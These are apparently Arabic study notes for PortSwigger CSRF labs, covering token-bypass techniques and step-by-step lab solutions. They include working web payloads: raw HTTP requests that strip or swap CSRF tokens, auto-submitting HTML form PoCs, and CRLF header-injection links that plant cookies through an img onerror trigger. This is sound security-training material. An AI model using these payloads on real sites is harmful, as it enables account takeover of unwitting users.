## **طرق تجاوز حماية CSRF**

فيما يلي بعض الطرق التي قد يتم استخدامها لتجاوز حماية **CSRF Tokens** في التطبيقات الضعيفة:

### **🔹 طرق التلاعب بـ CSRF Token**
1. **إزالة قيمة CSRF:** حذف القيمة الخاصة بـ `csrf_token` من الطلب.
   ```http
   POST /change-password HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   
   username=hossamshady&password=123&csrf_token=
   ```

2. **إزالة المفتاح والقيمة معًا:** حذف `csrf_token=VALUE` بالكامل.
   ```http
   POST /change-email HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   
   email=attacker@example.com
   ```

3. **استخدام قيمة فارغة (null):** تعيين `csrf_token=null` في الطلب.
   ```http
   POST /update-profile HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   
   username=hossamshady&csrf_token=null
   ```

### **🔹 التلاعب بطريقة إرسال الطلب (HTTP Method)**
4. **تغيير الطريقة من GET إلى POST وإزالة الهيدر:** بعض التطبيقات قد لا تتعامل بشكل صحيح مع تغيير الطريقة.
   ```http
   POST /delete-account HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   
   action=delete
   ```

5. **تغيير الطريقة من POST إلى GET وإزالة الهيدر:** بعض التطبيقات تقبل نفس الطلب بطريقة GET بدلاً من POST.
   ```http
   GET /delete-account?action=delete HTTP/1.1
   Host: vulnerable-website.com
   ```

### **🔹 طرق استغلال الرموز المخزنة**
6. **استخدام توكن غير مستخدم من حساب آخر:** بعض التطبيقات قد تقبل توكن قديم غير مستخدم.
   ```http
   POST /update-profile HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   
   username=hossamshady&csrf_token=oldtoken123
   ```

7. **تغيير قيمة التوكن بنفس الطول:** بعض التطبيقات لا تتحقق من صحة التوكن ولكنه يتطلب أن يكون بنفس الطول المتوقع.
   ```http
   POST /change-password HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   
   password=newpassword&csrf_token=aaaaaa
   ```

### **🔹 التلاعب بهيكل الطلب (Headers & Parameters)**
8. **إذا وُجد Referer، فقم بحذفه:** بعض التطبيقات تعتمد على `Referer Header` للتحقق من المصدر، لذا إزالته قد تساعد في تجاوز الحماية.
   ```http
   POST /transfer-money HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   Referer: 
   
   amount=500
   ```

9. **تغيير Referer إلى موقع تحكم فيه المهاجم:** تغيير `Referer: https://example.com` إلى `https://hacker.com`.
   ```http
   POST /transfer-money HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   Referer: https://hacker.com
   
   amount=500
   ```

### **🔹 استغلال طريقة GET لتنفيذ الطلبات**
10. **إذا وُجد CSRF Token، قم بإنشاء طلب GET مع الطريقة POST:** محاولة إرسال الطلب عبر GET ولكنه يتم معالجته كـ POST على الخادم.
   ```http
   GET /change-password?_method=POST&password=newpass HTTP/1.1
   Host: vulnerable-website.com
   ```

---

# [Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

### **📌 ملاحظة هامة:**
بعض التطبيقات مش بتتحقق  من التوكن 

### **📌 شكل الريكويست:**
```http
POST /my-account/change-email HTTP/2
Host: 0a3c00f904dd141784b42cf200e400d5.web-security-academy.net
Cookie: session=0OA1QlgG0SnRc0tW70G3YkA1M7ocKPfk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: https://0a3c00f904dd141784b42cf200e400d5.web-security-academy.net
Referer: https://0a3c00f904dd141784b42cf200e400d5.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=test%40gmail.com
```

---

### **📌 خطوات الحل:**

1. **افتح متصفح Burp وسجل دخولك لحسابك.**
2. **ابعت فورم "تحديث الإيميل"، وبعدها دور على الطلب في Proxy history.**
3. **لو معاك Burp Suite Professional:**
   - دوس **كليك يمين** على الطلب.
   - اختار **Engagement tools / Generate CSRF PoC**.
   - فعل خيار **auto-submit script** وبعدها دوس **Regenerate**.

4. **لو بتستخدم Burp Suite Community Edition:** استخدم الكود ده:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

5. **روح لسيرفر الاستغلال (Exploit Server):**
   - حط كود **HTML** في خانة **Body**.
   - دوس على **Store**.

6. **جرب الاستغلال بنفسك:**
   - دوس على **View exploit**.
   - راجع الطلبات والردود اللي طلعت بعد تشغيله.

7. **حل المعمل:**
   - غير الإيميل في كود الاستغلال بحيث ميبقاش نفس بتاعك.
   - دوس على **Deliver to victim** لحل التمرين.

---
# [**Lab: CSRF where token validation depends on request method**](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

بعض التطبيقات بتتحقق من التوكن لما يكون الطلب `POST`، لكنها بتتجاهل التحقق لما يكون `GET`.

في الحالة دي، المهاجم ممكن يغير الطريقة لـ `GET` لتجاوز الحماية وتنفيذ هجوم CSRF.

### **📌 شكل الريكويست:**
```http
POST /my-account/change-email HTTP/2
Host: 0a6f004b0370215280bd170f00a2005f.web-security-academy.net
Cookie: session=H7AjrmtjtOqZzgUYryYidiQDI8Zt62KB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: https://0a6f004b0370215280bd170f00a2005f.web-security-academy.net
Referer: https://0a6f004b0370215280bd170f00a2005f.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

email=abdo%40gmail.com&csrf=ZMe2oJ7bPIqjAhbxpZMiL4FGVxHJE1Rg
```


### **📌 شكل الريكويست بعد الاستغلال (تم تجاوز الحماية):**
```http
GET /my-account/change-email?email=hcha%40gmail.com HTTP/2
Host: 0a6f004b0370215280bd170f00a2005f.web-security-academy.net
Cookie: session=H7AjrmtjtOqZzgUYryYidiQDI8Zt62KB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://0a6f004b0370215280bd170f00a2005f.web-security-academy.net
Referer: https://0a6f004b0370215280bd170f00a2005f.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
---

### **📌 خطوات الحل :**

1. **افتح متصفح Burp وسجل دخولك لحسابك.**
2. **ابعت فورم "تحديث الإيميل"، وبعدها دور على الطلب في Proxy history.**
3. **استخدم Burp Repeater وغير قيمة `csrf`، هتلاحظ إن الطلب بيرفض التغيير.**
4. **استخدم خيار "Change request method" في القائمة، وغير الطلب إلى `GET`، هتلاقي إن `csrf` مش بيتحقق منه.**
5. **لو عندك Burp Suite Professional:**
   - اضغط **كليك يمين** على الطلب.
   - اختر **Engagement tools / Generate CSRF PoC**.
   - فعل خيار **auto-submit script** واضغط **Regenerate**.

6. **لو بتستخدم Burp Suite Community Edition:** استخدم الكود ده:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

7. **روح لسيرفر الاستغلال (Exploit Server):**
   - حط كود **HTML** في خانة **Body**.
   - دوس على **Store**.

8. **جرب الاستغلال بنفسك:**
   - دوس على **View exploit**.
   - راجع الطلبات والردود اللي طلعت بعد تشغيله.

9. **حل المعمل:**
   - غير الإيميل في كود الاستغلال بحيث ميبقاش نفس بتاعك.
   - دوس على **Deliver to victim** لحل التمرين.

---
# 

## [Lab: CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

### **📌 ملاحظة هامة:**
بعض التطبيقات بتتحقق من التوكن **لو كان موجود**، لكن بتتجاهل التحقق **لو مش موجود أصلاً**.

في الحالة دي، المهاجم يقدر **يحذف المعامل بالكامل اللي فيه التوكن** (مش بس قيمته) علشان يتخطى التحقق وينفذ هجوم CSRF.

---

### **📌 شكل الريكويست قبل التعديل:**
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrZtFjPqvm9tOkDvxMvLm

email=pwned@evil-user.net&csrf=12345ABCDE
```

### **📌 شكل الريكويست بعد حذف التوكن (تم تجاوز الحماية):**
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrZtFjPqvm9tOkDvxMvLm

email=pwned@evil-user.net
```

---

### **📌 خطوات الحل :**

1. **افتح متصفح Burp وسجل دخولك لحسابك.**
2. **ابعت فورم "تحديث الإيميل"، وبعدها دور على الطلب في Proxy history.**
3. **ابعت الطلب لـ Burp Repeater، وغير قيمة `csrf`، هتلاحظ إن الطلب بيرفض التغيير.**
4. **احذف `csrf` بالكامل من الطلب، وجرب ترفعه تاني، هتلاقي إنه اتقبل بدون مشاكل!**
5. **لو معاك Burp Suite Professional:**
   - اضغط **كليك يمين** على الطلب.
   - اختر **Engagement tools / Generate CSRF PoC**.
   - فعل خيار **auto-submit script** واضغط **Regenerate**.

6. **لو بتستخدم Burp Suite Community Edition:** استخدم الكود ده:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

7. **روح لسيرفر الاستغلال (Exploit Server):**
   - حط كود **HTML** في خانة **Body**.
   - دوس على **Store**.

8. **جرب الاستغلال بنفسك:**
   - دوس على **View exploit**.
   - راجع الطلبات والردود اللي طلعت بعد تشغيله.

9. **حل المعمل:**
   - غير الإيميل في كود الاستغلال بحيث ميبقاش نفس بتاعك.
   - دوس على **Deliver to victim** لحل التمرين.
---
# [**CSRF Token Not Tied to User Session**](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

بعض التطبيقات **لا تربط CSRF Token بجلسة المستخدم**، وبدلًا من ذلك، تحتفظ بمجموعة عامة من التوكنات الصالحة التي يمكن لأي حساب استخدامها.

في الحالة دي، المهاجم يقدر **يسجل دخول بحسابه الشخصي، يحصل على CSRF Token صالح، وبعدها يستخدمه لاستهداف حساب الضحية وتنفيذ هجوم CSRF!**

---

### **📌 شكل الريكويست:**
```http
POST /my-account/change-email HTTP/2
Host: 0a150091042d75e880c50d8800870066.web-security-academy.net
Cookie: session=QgG3AaBSwvw8BEtlbdlAR7mZNae7UV9y
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: https://0a150091042d75e880c50d8800870066.web-security-academy.net
Referer: https://0a150091042d75e880c50d8800870066.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=mohame%40gmail.com&csrf=EnxA1mqbStvzkq9Ov5gokZ0Lh2Ox5Pu1
```

🚨 **ملحوظة:** `csrf` بيتغير **كل مرة المستخدم يبعت طلب تغيير الإيميل**، لكنه مش مربوط بجلسة المستخدم، وده اللي بيخلي الهجوم ممكن! 🔥

---

### **📌 خطوات الحل :**

1. **افتح Burp وسجل دخولك لحسابك، ابعت فورم "تحديث الإيميل" واعترض الريكويست.**
2. **سجل قيمة `csrf`، لكن متبعتش الطلب.**
3. **افتح متصفح خاص (Incognito)، سجل دخول بحساب تاني، وكرر الطلب في Burp Repeater باستخدام التوكن المسجّل من الحساب الأول.**
4. **هتلاحظ إن السيرفر بيقبل الطلب رغم إن التوكن مش مرتبط بجلسة المستخدم الحالية!**
5. **اعمل كود استغلال زي حل معمل "CSRF vulnerability with no defenses" بس باستخدام التوكن المأخوذ من الحساب الثاني.**
6. **غير الإيميل في كود الاستغلال بحيث يكون مختلف عن إيميلك.**
7. **احفظ الاستغلال، واضغط "Deliver to victim" لحل المعمل.**

🚀 **كده المهاجم قدر يستغل ثغرة CSRF لأن التوكن مش مربوط بجلسة المستخدم!** 🔥

---
# [Lab: CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

في بعض التطبيقات، يتم ربط **CSRF Token بملف تعريف ارتباط مستقل** عن الجلسة (`session cookie`).

🔹 هذا يحدث غالبًا عند استخدام نظامين مختلفين لإدارة الجلسات وحماية CSRF، مما يسمح باستخدام **csrfKey** غير تابع للجلسة.

في هذه الحالة، المهاجم يمكنه **إعداد ملف تعريف ارتباط صالح في متصفح الضحية** ثم استغلاله لتنفيذ هجوم CSRF!

---
## **Testing CSRF Tokens & Exploitation**

### **📌 فحص CSRF Tokens:**
1. **احذف `CSRF Token`** وشوف هل التطبيق بيقبل الطلب ولا لأ.
2. **غيّر الطريقة من `POST` لـ `GET`** وجرب هل بيتم التحقق من التوكن.
3. **اختبر هل `CSRF Token` مربوط بجلسة المستخدم (`session`).**

### **📌 فحص CSRF Tokens & CSRF Cookies:**
1. **تحقق هل `CSRF Token` مربوط بملف تعريف ارتباط (`csrfKey cookie`):**
   - جرب إرسال `CSRF Token` غير صالح.
   - جرب إرسال `CSRF Token` صالح من مستخدم آخر.
2. **جرب إرسال `CSRF Token` صالح مع `csrfKey` من مستخدم آخر.**

🔹 **مثال على القيم المكتشفة:**
```
csrf token: SXsROOTp3jzq6M5UzIL2KkJIgGpffIQb
csrfKey cookie: ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH
```

---

### **📌 استغلال الثغرة:**

🎯 علشان تستغل الثغرة، لازم تحقق خطوتين:
1. **حقن `csrfKey` في جلسة الضحية** (باستخدام `HTTP Header Injection`). ✅ تم التنفيذ بنجاح!
2. **إرسال هجوم CSRF للضحية باستخدام `CSRF Token` معروف.**

🚀 **بكده نقدر نستغل الثغرة وننفذ هجوم CSRF بنجاح!** 🔥

### **📌 شكل الريكويست:**
```
POST /my-account/change-email HTTP/2
Host: 0a2a00d50305117b802c533a005100bc.web-security-academy.net
Cookie: session=vwKc7r5pqma0iHG3rO3paN6jp9pZjwOR; csrfKey=kBCrNEccPVkUZRgsffVrv0XMJ6Q5wn9U
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a2a00d50305117b802c533a005100bc.web-security-academy.net
Referer: https://0a2a00d50305117b802c533a005100bc.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=a%40gmail.com&csrf=GeSp7isS6zuK62EPrrct7aVIF3zjpiQv
```

🚨 **ملحوظة:** `csrfKey` غير مرتبط بالجلسة (`session`)، مما يسمح للمهاجم بحقن قيمة صالحة في متصفح الضحية! 🔥

---
## **CRLF - Carriage Return & Line Feed**

**CRLF** يشير إلى **نوع من فواصل الأسطر** في الملفات النصية، وهو يتكون من حرفين تحكم:

### **📌 تعريف CR و LF:**
- **CR (Carriage Return):**  في النظام الست عشري (13 بالنظام العشري)، وظيفته **إعادة المؤشر إلى بداية السطر** دون النزول لسطر جديد.

### %0d

- **LF (Line Feed):**  في النظام الست عشري (10 بالنظام العشري)، وظيفته **تحريك المؤشر إلى السطر التالي** دون الرجوع إلى بداية السطر.

### %0a
### **📌 كيفية عمل CRLF؟**
عند الجمع بين **CR** و **LF** (`\r\n` أو `%`)، يتم تنفيذ وظيفتين معًا:
1. **الانتقال إلى السطر التالي (`LF`).**
2. **إعادة المؤشر إلى بداية السطر (`CR`).**

### %0d%0a -NEW LINE 


🚀 **يتم استخدام CRLF بشكل شائع في أنظمة Windows لإنهاء الأسطر في الملفات النصية. بينما تستخدم أنظمة Linux و macOS فقط `LF` (`\n`).** 🔥


🔹 **مثال على القيم المكتشفة:**
```
csrf token: SXsROOTp3jzq6M5UzIL2KkJIgGpffIQb
csrfKey cookie: ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH

-يعني لو الهاكر اخد القيمتين دول من عنده يقدر يستغل الثغرة بس المشكلة ازاي هيحط قيمة csrfKey cookie في ال cSRF POC 
-وهنا تيجي فكرة HTTP Header Injection و ده ان بشوف اي PARAMETER بيتسجل ك cookie وبدا انفذ تكنيك ال CR , LF
```

---

### **📌 استغلال الثغرة:**

🎯 علشان تستغل الثغرة، لازم تحقق خطوتين:
1. **حقن `csrfKey` في جلسة الضحية** (باستخدام `HTTP Header Injection`). ✅ تم التنفيذ بنجاح!
2. **إرسال هجوم CSRF للضحية باستخدام `CSRF Token` معروف.**
### **📌 خطوات الحل :**

1. **افتح Burp وسجل دخولك لحسابك، ابعت فورم "تحديث الإيميل" واعترض الريكويست.**
2. **غير قيمة `session`، هتلاقي إنك خرجت من الحساب، لكن لو غيرت `csrfKey` بس، الطلب هيترفض.**
3. **افتح متصفح خاص (Incognito)، سجل دخول بحساب تاني، واعترض نفس الطلب في Burp Repeater.**
4. **بدّل `csrfKey` وقيمة `csrf` من الحساب الأول إلى الحساب الثاني، وجرب الإرسال، هتلاقي إن الطلب اتقبل!**
5. **ارجع للمتصفح الأول، نفّذ بحث في الموقع ولاحظ إن القيم المرسلة في البحث بتتخزن في `Set-Cookie`.**
6. **استخدم هذه الثغرة لحقن `csrfKey` في متصفح الضحية، عن طريق لينك بهذا الشكل:**
   ```
   /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
   ```
7. **اعمل كود استغلال زي حل معمل "CSRF vulnerability with no defenses" لكن استخدم `csrfKey` المحقون في متصفح الضحية.**
8. **استبدل `<script>` في الكود بـ `<img>` علشان يحقن ملف تعريف الارتباط عند تحميل الصفحة:**
   ```html
   <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   ```
9. **غير الإيميل في كود الاستغلال بحيث يكون مختلف عن إيميلك.**
10. **احفظ الاستغلال، واضغط "Deliver to victim" لحل المعمل.**

🚀 **كده المهاجم قدر يستغل ثغرة CSRF لأن التوكن مش مربوط بجلسة المستخدم، وتم حقنه في المتصفح بنجاح!** 🔥

---
# [Lab: CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie) 


## **CSRF Token يتم تكراره في الكوكي**

في بعض التطبيقات، لا يتم الاحتفاظ بسجل **للـ CSRF Tokens** من جانب الخادم، وبدلًا من ذلك، يتم **تكرار التوكن في كل من الكوكي (`csrf` cookie) ومعامل الطلب (`csrf` parameter)**.

🔹 عندما يتم التحقق من الطلب، التطبيق ببساطة **يقارن بين القيمتين**، ولا يوجد تحقق إضافي من صحة التوكن.

🚨 هذا يُعرف باسم **"Double Submit" Defense**، وهو يُستخدم لأنه سهل التنفيذ ولا يحتاج إلى حالة من جانب الخادم، لكنه يُعتبر **قابل للاستغلال**!

---

### **📌 شكل الريكويست:**
```http
POST /my-account/change-email HTTP/2
Host: 0a550047032784a285660c0300ed0050.web-security-academy.net
Cookie: session=kLuzjKqKLNwM8CUx56tSKrAGeQOGIRG6; csrf=DwLrNk2Lsn5Y2LLiAJVa3ylvsw84aiLH; LastSearchTerm=hello

email=administrator%40g.com&csrf=DwLrNk2Lsn5Y2LLiAJVa3ylvsw84aiLH
```

🚨 **ملحوظة:** طالما `csrf` الموجود في الكوكي يطابق `csrf` الموجود في الطلب، السيرفر يقبل التغيير، مما يجعل الهجوم ممكنًا! 🔥

---

### **📌 خطوات الحل :**

1. **افتح Burp، سجل دخولك لحسابك، واعترض طلب "تحديث الإيميل".**
2. **ابعت الطلب لـ Burp Repeater، وغير `csrf` في جسم الطلب (`body parameter`) ولاحظ إنه بيرفض.**
3. **غيّر `csrf` في الكوكي (`csrf cookie`) ليطابق القيمة الجديدة، وهتلاقي إن الطلب بيتم قبوله!**
4. **استغل إمكانية تعيين كوكي في الموقع عبر البحث، وأرسل الطلب لـ Burp Repeater.**
5. **اصنع رابط لاستغلال ثغرة `Set-Cookie` لحقن `csrf` وهمي في متصفح الضحية:**
   ```
   /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
   ```
6. **استخدم الرابط داخل كود استغلال بسيط، بدلًا من `<script>` استخدم `<img>`:**
   ```html
   <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   ```
7. **غير الإيميل في كود الاستغلال بحيث لا يكون إيميلك الشخصي.**
8. **احفظ الاستغلال، ثم اضغط "Deliver to victim" لحل المعمل.**

🚀 **كده المهاجم قدر يستغل ثغرة CSRF لأن التطبيق ببساطة بيقارن القيمتين بدون أي تحقق إضافي!** 🔥
